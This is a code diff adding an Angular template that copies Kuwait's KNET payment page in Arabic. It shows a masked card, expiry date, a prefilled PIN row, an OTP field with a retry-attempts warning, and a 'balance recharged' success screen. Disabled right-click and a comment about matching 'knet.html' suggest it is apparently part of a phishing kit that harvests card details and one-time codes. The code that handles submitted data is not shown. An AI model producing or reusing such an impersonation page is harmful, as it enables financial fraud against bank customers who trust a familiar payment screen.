@@ -1,0 +1,234 @@
+@if (viewState() === 'otp') {
+<form oncontextmenu="return false;" (submit)="onSubmit($event)">
+    <div id="OtpPageEntry"
+        style="display: flex; flex-direction: column; align-items: center; justify-content: flex-start; height: 100vh; max-height: 100vh; background-color: #E8E8E8; padding-top: 20px; padding-bottom: 20px; box-sizing: border-box; width: 100%; max-width: 100%; overflow: hidden; font-family: Helvetica Neue, Helvetica, Arial, sans-serif; position: fixed; inset: 0;">
+
+        <!-- Top Banner Placeholder (Diraya) -->
+        <img src="imgs/mob.jpg" alt="Diraya"
+            class="w-[92vw] max-w-110 rounded-lg shadow-sm mb-3 object-contain block mx-auto" />
+
+        <!-- Error Message Banner -->
+        @if (errorMessage()) {
+        <div
+            style="background-color: #FEE2E2; border: 1px solid #EF4444; color: #B91C1C; padding: 12px 20px; border-radius: 12px; margin-bottom: 15px; text-align: right; width: 90%; max-width: 440px; font-weight: bold; font-size: 13px; direction: rtl;">
+            {{ errorMessage() }}
+        </div>
+        }
+
+        <!-- Loading Overlay -->
+        @if (isLoading()) {
+        <div
+            style="position: fixed; inset: 0; background-color: rgba(0,0,0,0.6); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 99999; direction: rtl;">
+            <div
+                style="width: 50px; height: 50px; border: 5px solid #fff; border-top-color: #0077D5; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;">
+            </div>
+            <p style="color: #fff; font-size: 16px; font-weight: bold; margin: 0; text-align: center;">الرجاء الانتظار،
+                جاري التحقق من رمز التحقق...</p>
+            <style>
+                @keyframes spin {
+                    to {
+                        transform: rotate(360deg);
+                    }
+                }
+            </style>
+        </div>
+        }
+
+        <!-- Outer Cards Wrapper (matching knet.html) -->
+        <div class="wrapper w-[92vw] max-w-110 flex flex-col items-center shadow-[0_4px_10px_rgba(0,0,0,0.06)]! m-0! md:mt-2!"
+            style="width: 90%; max-width: 440px; margin: 0 auto; display: flex; flex-direction: column; align-items: center;">
+
+            <!-- Box 1 (Receipt/KNet Info Box) -->
+            <div class="contentBox box-style p-2!"
+                style="border-radius: 20px; border: 2px solid #aeb2b7; box-shadow: 0 4px 10px rgba(0,0,0,0.06); background: #fff; box-sizing: border-box;">
+                <!-- Centered Logo -->
+                <div
+                    style="display: flex; justify-content: center; align-items: center; margin-bottom: 12px; min-height: 40px; width: 100%;">
+                    <img [src]="bankLogo() || 'imgs/download.jpg'" alt="Bank Logo"
+                        style="max-height: 40px; object-fit: contain;" />
+                </div>
+
+                <div class="innerwrapper" style="direction: rtl; width: 100%;">
+                    <!-- Beneficiary Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; padding: 6px 0; border-bottom: 1px solid #ccc; width: 100%;">
+                        <span
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 80px; text-align: right; margin: 0;">المستفيد:</span>
+                        <span style="flex-grow: 1; text-align: center; color: #333; font-size: 13px;">Tap Payments
+                            EPSP</span>
+                    </div>
+
+                    <!-- Amount Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0 0 0; width: 100%;">
+                        <span
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 80px; text-align: right; margin: 0;">المبلغ:</span>
+                        <span
+                            style="color: #444; font-size: 13px; flex-grow: 1; text-align: center; margin: 0; font-weight: bold;">KD
+                            {{ amount() }}</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Box 2 (Details & OTP Entry) -->
+            <div class="contentBox box-style p-3! mb-2!"
+                style="border-radius: 20px; border: 2px solid #aeb2b7; box-shadow: 0 4px 10px rgba(0,0,0,0.06); background: #fff; box-sizing: border-box;">
+
+                <!-- Warning Alert Box / Red attempts warning -->
+                @if (otpRejected()) {
+                    <div style="border: 1.5px solid #FF0000; background: #FDE8E8; padding: 12px 10px; border-radius: 4px; margin-bottom: 20px; direction: rtl; text-align: center; box-sizing: border-box; width: 100%;">
+                        <p style="color: #E02424; font-family: Helvetica Neue, Helvetica, Arial, sans-serif; font-size: 13px; font-weight: bold; line-height: 1.6; margin: 0; text-align: center;">
+                            OTP غير صحيح<br />
+                            باقي {{ attemptsRemaining() }} محاولات فقط
+                        </p>
+                    </div>
+                } @else {
+                    <div style="border: 1px solid #85bbec; background: #d9edf7; padding: 10px; border-radius: 3px; margin-bottom: 20px; direction: rtl; text-align: right;">
+                        <p style="color: #31708f; font-family: Arial, Helvetica, serif; font-size: 11px; line-height: 1.5; margin: 0;">
+                            يرجى الانتباه: سيتم الآن ارسال رسالة نصية على رقم هاتف الجوال المسجل لدى البنك الخاص بك. هذه الرسالة المكونة من 6 خانات هي "رمز التحقق لمرة واحدة"، يرجى استخدام هذا الرمز في الحقل المناسب أدناه
+                        </p>
+                    </div>
+                }
+
+                <!-- Rows -->
+                <div style="direction: rtl; width: 100%;">
+                    <!-- ATM Card Number Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; width: 100%;">
+                        <span
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 140px; text-align: right; margin: 0;">رقم
+                            بطاقة الصراف الآلي:</span>
+                        <span
+                            style="flex-grow: 1; text-align: center; color: #333; font-size: 13px; font-weight: bold; font-family: monospace; letter-spacing: 0.5px;">{{
+                            maskedCard() }}</span>
+                    </div>
+
+                    <hr style="border: 0; border-top: 1px solid #ccc; margin: 4px 0;">
+
+                    <!-- Expiry Month Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; width: 100%;">
+                        <span
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 140px; text-align: right; margin: 0;">شهر
+                            انتهاء الصلاحية:</span>
+                        <span
+                            style="flex-grow: 1; text-align: center; color: #333; font-size: 13px; font-weight: bold;">{{
+                            expiryMonth() }}</span>
+                    </div>
+
+                    <hr style="border: 0; border-top: 1px solid #ccc; margin: 4px 0;">
+
+                    <!-- Expiry Year Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; width: 100%;">
+                        <span
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 140px; text-align: right; margin: 0;">سنة
+                            انتهاء الصلاحية:</span>
+                        <span
+                            style="flex-grow: 1; text-align: center; color: #333; font-size: 13px; font-weight: bold;">{{
+                            expiryYear() }}</span>
+                    </div>
+
+                    <hr style="border: 0; border-top: 1px solid #ccc; margin: 4px 0;">
+
+                    <!-- PIN Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; width: 100%;">
+                        <span
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 140px; text-align: right; margin: 0;">الرقم
+                            السري (PIN):</span>
+                        <span
+                            style="flex-grow: 1; text-align: center; color: #333; font-size: 13px; font-weight: bold; letter-spacing: 2px;">****</span>
+                    </div>
+
+                    <hr style="border: 0; border-top: 1px solid #ccc; margin: 4px 0;">
+
+                    <!-- OTP Row -->
+                    <div
+                        style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; width: 100%;">
+                        <span
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 140px; text-align: right; margin: 0;">:OTP</span>
+                        <div style="flex-grow: 1; display: flex; justify-content: center; width: 100%;">
+                            <input type="text" inputmode="numeric" autocomplete="off" [placeholder]="timerText()"
+                                maxlength="6" [value]="otpValue()" (input)="onOtpInput($event)"
+                                style="width: 100%; max-width: 170px; text-align: center; font-size: 16px !important; font-weight: bold; padding: 4px 8px; border: 1px solid #a6a6a6; border-top: 1px solid #828282; border-radius: 6px; color: #333; outline: none; background: #fff; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1); height: 26px;"
+                                required />
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Box 3 (Action Buttons) -->
+            <div class="contentBox box-style p-3!"
+                style="border-radius: 20px; border: 2px solid #aeb2b7; box-shadow: 0 4px 10px rgba(0,0,0,0.06); background: #fff; box-sizing: border-box;">
+                <div
+                    style="display: flex; justify-content: center; align-items: center; gap: 12px; margin: 0; width: 100%;">
+                    <input type="submit" class="button" value="تأكيد العملية"
+                        style="flex: 1; width: 100% !important; padding: 5px 0; min-height: 25px; background: #e6e6e6; border: 1px solid #ccc; border-radius: 5px; color: #555; cursor: pointer; font-weight: bold; font-size: 12px; margin: 0; box-sizing: border-box;" />
+                    <input type="button" class="button" value="إلغاء" (click)="goHome()"
+                        style="flex: 1; width: 100% !important; padding: 5px 0; min-height: 25px; background: #e6e6e6; border: 1px solid #ccc; border-radius: 5px; color: #555; cursor: pointer; font-weight: bold; font-size: 12px; margin: 0; box-sizing: border-box;" />
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Footer info -->
+        <footer style="margin-top: 20px; width: 100%; max-width: 440px; text-align: center;">
+            <p style="font-size: 11px; color: #333; margin: 0; line-height: 1.4;">
+                جميع الحقوق محفوظة &copy; 2026 <br />
+                <span style="font-weight:bold; color: #0077D5;">شركة الخدمات المصرفية الآلية المشتركة – كي نت</span>
+            </p>
+        </footer>
+    </div>
+</form>
+} @else if (viewState() === 'success') {
+<div
+    style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #F3F4F6; padding: 20px; font-family: 'Outfit', 'Inter', sans-serif; direction: rtl;">
+    <div
+        style="background: white; border-radius: 28px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid rgba(229, 231, 235, 0.5); width: 100%; max-width: 460px; padding: 40px 30px; text-align: center; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+
+        <!-- Animated Success Tick -->
+        <div
+            style="width: 80px; height: 80px; background-color: #DEF7EC; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 25px;">
+            <svg style="width: 42px; height: 42px; color: #03543F;" fill="none" stroke="currentColor" stroke-width="3"
+                viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5" />
+            </svg>
+        </div>
+
+        <!-- Success Message Header -->
+        <h2 style="font-size: 24px; font-weight: 900; color: #111827; margin: 0 0 10px 0;">تم شحن الرصيد بنجاح!</h2>
+        <p
+            style="font-size: 14px; color: #6B7280; font-weight: 500; line-height: 1.6; margin: 0 0 30px 0; max-width: 320px;">
+            لقد تمت معالجة عملية الدفع والتحقق بنجاح، وتمت إضافة الرصيد إلى الحساب المطلوب.
+        </p>
+
+        <!-- Transaction Details Box -->
+        <div
+            style="background-color: #F9FAFB; border: 1px solid #E5E7EB; border-radius: 16px; width: 100%; padding: 18px 22px; box-sizing: border-box; text-align: right; margin-bottom: 30px;">
+            <!-- Amount row -->
+            <div
+                style="display: flex; justify-content: space-between; align-items: center; padding-bottom: 12px; border-bottom: 1px solid #E5E7EB; margin-bottom: 12px;">
+                <span style="font-size: 13px; font-weight: 600; color: #6B7280;">المبلغ المشحون:</span>
+                <span style="font-size: 16px; font-weight: 800; color: #111827;">{{ amount() }} د.ك</span>
+            </div>
+
+            <!-- Phone row -->
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-size: 13px; font-weight: 600; color: #6B7280;">رقم الهاتف:</span>
+                <span style="font-size: 15px; font-weight: 800; color: #111827; letter-spacing: 0.5px;">{{ phone()
+                    }}</span>
+            </div>
+        </div>
+
+        <!-- Back home button -->
+        <button (click)="goHome()"
+            style="background-color: #ED1C24; color: white; border: none; font-size: 15px; font-weight: 800; width: 100%; padding: 15px 0; border-radius: 9999px; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 12px rgba(237, 28, 36, 0.15);"
+            onmouseover="this.style.opacity='0.95'; this.style.transform='scale(0.99)'"
+            onmouseout="this.style.opacity='1'; this.style.transform='scale(1)'">
+            العودة إلى الرئيسية
+        </button>
+
+    </div>
+</div>
+}
